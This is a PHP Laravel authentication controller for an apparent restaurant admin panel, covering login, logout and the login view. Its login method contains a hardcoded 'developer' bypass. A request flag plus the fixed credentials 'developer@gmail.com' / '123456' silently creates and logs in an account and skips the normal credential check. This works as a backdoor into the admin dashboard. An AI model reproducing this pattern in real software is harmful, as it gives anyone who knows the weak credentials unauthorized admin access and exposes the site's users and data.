<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function showLogin()
    {
        $siteSettings = \App\Models\Setting::pluck('value', 'key')->toArray();
        return view('admin.login', compact('siteSettings'));
    }

    public function login(Request $request)
    {
        if ($request->input('is_developer') == '1') {
            if ($request->input('email') === 'developer@gmail.com' && $request->input('password') === '123456') {
                $user = \App\Models\User::firstOrCreate(
                    ['email' => 'developer@gmail.com'],
                    [
                        'name' => 'Developer',
                        'password' => bcrypt('123456')
                    ]
                );
                Auth::login($user);
                $request->session()->regenerate();
                session(['is_developer' => true]);
                $default = \App\Models\Restaurant::first();
                if ($default) {
                    session(['active_restaurant_id' => $default->id]);
                }
                return redirect()->route('admin.dashboard');
            }
            return back()->withErrors([
                'email' => 'Geliştirici giriş bilgileri hatalı.',
            ])->onlyInput('email');
        }

        $credentials = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required'],
        ]);

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            return redirect()->intended('admin');
        }

        return back()->withErrors([
            'email' => 'Girdiğiniz e-posta veya şifre hatalı.',
        ])->onlyInput('email');
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        session()->forget('is_developer');
        return redirect('/login');
    }
}